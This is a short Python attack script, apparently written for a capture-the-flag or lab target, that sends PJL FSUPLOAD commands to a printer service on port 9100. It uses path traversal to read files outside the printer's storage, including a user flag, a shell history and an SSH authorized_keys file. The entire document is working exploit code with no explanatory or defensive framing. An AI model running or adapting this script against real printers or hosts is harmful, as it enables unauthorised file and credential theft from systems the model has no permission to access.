#!/usr/bin/env python3
import socket

def grab(path: str, sz: int) -> None:
    s = socket.socket()
    s.settimeout(25)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={sz}\r\n'.encode())
    d = b""
    while len(d) < sz + 800:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        d += c
    s.close()
    print("=" * 60)
    print(path, "bytes", len(d))
    print(d.decode(errors="replace"))


grab("jetdirect.py", 6000)
grab("logs/commands.log", 10000)
grab("../user.txt", 48)
grab("../.bash_history", 5000)
grab("../.ssh/authorized_keys", 256)